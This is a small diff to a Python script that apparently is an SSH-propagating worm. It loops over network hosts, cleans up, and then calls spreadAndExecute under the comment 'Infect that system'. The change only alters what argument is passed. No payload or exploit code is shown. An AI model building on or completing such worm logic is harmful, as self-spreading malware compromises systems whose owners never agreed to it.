@@ -311,7 +311,7 @@ for host in networkHosts:
             print("Trying to clean")
 
             # Clean the system
-            cleanUp(sshInfo[0])
+            cleanUp(sshInfo)
 
             print("Cleanup complete")
 
@@ -319,7 +319,7 @@ for host in networkHosts:
             print("Trying to spread")
             
             # Infect that system
-            spreadAndExecute(sshInfo[0])
+            spreadAndExecute(sshInfo)
             
             print("Spreading complete")	
     
